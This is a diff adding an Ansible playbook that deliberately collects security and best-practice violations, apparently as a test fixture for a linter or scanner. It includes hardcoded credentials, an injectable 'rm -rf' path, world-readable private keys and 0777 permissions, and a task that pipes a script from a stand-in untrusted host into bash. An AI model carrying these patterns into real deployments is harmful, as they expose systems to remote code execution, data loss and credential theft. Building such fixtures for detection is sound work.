@@ -1,0 +1,99 @@
+---
+- name: Playbook with security and best practice violations
+  hosts: all
+  become: yes
+
+  vars:
+    db_user: "admin"
+    db_password: "SuperSecret123"
+    api_token: "sk-1234567890abcdef"
+    ssh_key_path: "./id_rsa"
+
+  tasks:
+    - name: Run dangerous shell command with hardcoded credentials
+      shell: "mysql -u {{ db_user }} -p{{ db_password }} -e 'CREATE DATABASE insecure_db;'"
+      register: db_result
+
+    - name: Execute command with user input (command injection risk)
+      command: "rm -rf /home/{{ user_input }}"
+      vars:
+        user_input: "{{ lookup('env', 'USER_INPUT') }}"
+
+    - name: Using shell module when command would suffice
+      shell: "mkdir -p /opt/app"
+
+    - name: Copy private key with insecure permissions
+      copy:
+        src: "{{ ssh_key_path }}"
+        dest: /etc/ssh/id_rsa
+        mode: '0644'
+
+    - name: Store credentials in plaintext variable
+      template:
+        src: database.conf.j2
+        dest: /etc/app/database.conf
+        vars:
+          password: "{{ db_password }}"
+
+    - name: Use deprecated docker_service module
+      docker_service:
+        project_name: myapp
+        definition:
+          version: "3"
+          services:
+            web:
+              image: nginx:latest
+
+    - name: Task without error handling
+      command: "systemctl restart nginx"
+
+    - name: Use with_items instead of loop
+      debug:
+        msg: "Processing {{ item }}"
+      with_items:
+        - item1
+        - item2
+
+    - name: run_once with loop (incorrect usage)
+      debug:
+        msg: "{{ item }}"
+      loop: "{{ range(5) }}"
+      run_once: yes
+
+    - name: Comparison using string instead of boolean
+      debug:
+        msg: "Condition met"
+      when: condition == "true"
+
+    - name: Missing handler for important changes
+      lineinfile:
+        path: /etc/nginx/nginx.conf
+        regexp: "worker_connections"
+        line: "worker_connections 4096;"
+
+    - name: Using raw module without proper validation
+      raw: "curl -s {{ api_endpoint }} | bash"
+      vars:
+        api_endpoint: "http://untrusted-source.com/script.sh"
+
+    - name: Set file permissions too permissive
+      file:
+        path: /opt/sensitive_data.json
+        state: file
+        mode: '0777'
+
+    - name: Task with no name (unimaginative automation)
+      package:
+        name: git
+        state: present
+
+    - name: Using jinja2 in when condition (risky)
+      debug:
+        msg: "Condition met"
+      when: "{{ my_var == 'value' }}"
+
+    - name: Hardcoded IP addresses instead of variables
+      add_host:
+        name: "192.168.1.100"
+        groups: web
+        ansible_user: root
